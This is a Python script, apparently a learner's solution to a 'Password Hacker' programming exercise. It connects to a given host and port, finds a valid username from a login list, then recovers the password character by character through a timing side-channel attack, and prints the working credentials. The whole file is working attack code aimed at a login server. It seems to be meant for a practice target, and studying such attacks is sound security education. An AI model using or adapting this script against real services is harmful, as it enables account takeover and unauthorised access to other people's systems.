import socket
import itertools
import os
import json
import string
import datetime
import sys


class Hacker():
    def __init__(self):
        self.arguments = sys.argv
        self.hostname = self.arguments[1]
        self.port = int(self.arguments[2])
        self.client_socket = socket.socket()

    def find_login(self):
        with open("c:\\Users\\bero8\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt", "r") as file:
            for line in file.readlines():
                username = line.strip("\n")
                try_login = {"login": username,
                             "password": ""}
                login_json = json.dumps(try_login)
                request = self.client_socket.send(login_json.encode())
                response_json = self.client_socket.recv(1024).decode()
                response = json.loads(response_json)
                if response["result"] == 'Wrong password!':
                    self.username = line.strip("\n")

    def find_password(self):
        letters = string.ascii_letters + str(string.digits)
        password = ""
        while(True):
            max_timeout = 0
            for i, letter in enumerate(letters):
                start = datetime.datetime.now()
                temp_password = password+letter
                try_login = {"login": self.username,
                             "password": temp_password}
                login_json = json.dumps(try_login)
                request = self.client_socket.send(login_json.encode())
                response_json = self.client_socket.recv(1024).decode()
                response = json.loads(response_json)
                finish = datetime.datetime.now()
                timeout = (finish - start).microseconds
                if timeout > max_timeout:
                    max_timeout = timeout
                    char_position = i
                elif response["result"] == "Connection success!":
                    print(login_json)
                    exit()

            password += letters[char_position]
            # print(password)

    def main(self):
        self.client_socket.connect((self.hostname, self.port))
        username = self.find_login()
        password = self.find_password()
        self.client_socket.close()


new_hack = Hacker().main()
